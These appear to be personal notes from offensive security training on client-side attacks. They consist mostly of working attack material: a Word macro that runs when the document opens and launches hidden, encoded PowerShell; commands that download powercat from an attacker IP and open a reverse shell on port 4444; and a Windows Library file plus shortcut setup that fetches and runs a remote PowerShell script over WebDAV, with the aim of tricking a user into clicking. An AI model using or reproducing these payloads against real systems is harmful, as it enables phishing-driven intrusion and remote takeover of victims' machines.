- Canarytokens - Generate a link to gather informations on the target : https://canarytokens.org/nest/

- **Macro words : **
```sh
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	CreateObject("Wscript.Shell").Run Str
End Sub
```
- Encode the command with base64 to avoid issues with special characters : 

```sh
IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c
192.168.119.2 -p 4444 -e powershell
Listing 216 - PowerShell
```


```sh
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
print("Str = Str + " + '"' + str[i:i+n] + '"')
Listing 217 - Python script to split a base64 encoded
```

```sh
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
		Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
		Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
	...
		Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
		Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
		Str = Str + "A== "

	CreateObject("Wscript.Shell").Run Str
End Sub
```

- **Abusing Windows Library Files :**

- Create a webdav server : 
```sh
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -
-root /home/kali/webdav/
```
- Create a file config.Library-ms with this content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://myip</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Create a lnk file and name it `automatic_configuration` : 
```sh
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.1.26:8080/shell.ps1')"
```

- Put those lnk in the  webdav directory and deliver the config.Library-ms and force the user to click in the  lnk .